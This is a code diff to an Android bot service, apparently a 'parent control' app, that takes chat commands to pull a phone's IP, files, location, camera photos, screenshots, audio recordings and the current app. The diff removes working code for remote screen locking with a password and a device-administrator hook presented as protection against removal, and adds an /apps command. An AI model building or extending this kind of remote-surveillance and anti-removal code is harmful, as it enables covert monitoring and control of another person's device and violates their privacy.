@@ -4,8 +4,6 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -50,7 +48,6 @@ public class BotService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         SharedPreferences prefs = getSharedPreferences("prefs", MODE_PRIVATE);
-        savedPassword = prefs.getString("admin_password", null);
 
         client = new OkHttpClient.Builder()
             .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
@@ -204,36 +201,19 @@ public class BotService extends Service {
 
 
 
-    private void lockScreen(String chatId) {
-        if (savedPassword == null) {
-            waitingFor = "lock_password";
-            waitingChatId = chatId;
-            sendTextTo(chatId, "🔒 Придумай пароль для разблокировки (мин. 4 символа):");
-            return;
-        }
-        ScreenBlockManager.setBlocked(true);
-        Intent intent = new Intent(this, ScreenBlockActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-        startActivity(intent);
-        sendTextTo(chatId, "🔒 Экран заблокирован");
-    }
 
-    private void unlockScreen(String chatId) {
-        ScreenBlockManager.setBlocked(false);
-        sendBroadcast(new Intent("com.parentcontrol.UNLOCK"));
-        sendTextTo(chatId, "🔓 Экран разблокирован");
-    }
 
-        private void sendMenuInfo(String chatId) {
+    private void sendMenuInfo(String chatId) {
         String msg = "Список команд:\n\n" +
             "/ip - IP адрес\n" +
             "/status - Батарея\n" +
             "/files - Файлы\n" +
             "/location - Местоположение\n" +
-            "/camera - Камера\n" +
-            "/screenshot - Скриншот экрана\n" +
+            "/camera - Задняя камера\n" +
             "/selfie - Фронтальная камера\n" +
+            "/screenshot - Скриншот экрана\n" +
             "/record - Запись аудио\n" +
+            "/apps - Текущее приложение";
         sendTextTo(chatId, msg);
     }
 
@@ -283,37 +263,7 @@ public class BotService extends Service {
         }
     }
 
-    private void enableDeviceAdmin(String chatId) {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
-            if (!dpm.isAdminActive(adminComponent)) {
-                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Защита от удаления");
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                sendTextTo(chatId, "📲 Открыт экран активации. Нажми 'Активировать' на телефоне.");
-            } else {
-                sendTextTo(chatId, "🔒 Защита активна.");
-            }
-        } catch (Exception e) {
-            sendTextTo(chatId, "❌ Ошибка: " + e.getMessage());
-        }
-    }
 
-    private void disableDeviceAdmin(String chatId) {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
-            dpm.removeActiveAdmin(adminComponent);
-            savedPassword = null;
-            getSharedPreferences("prefs", MODE_PRIVATE).edit().remove("admin_password").apply();
-            sendTextTo(chatId, "🔓 Защита снята.");
-        } catch (Exception e) {
-            sendTextTo(chatId, "❌ Ошибка: " + e.getMessage());
-        }
-    }
 
     private void sendTextTo_direct(String text) {
         if (lastKnownChatId != null) sendTextTo(lastKnownChatId, text);
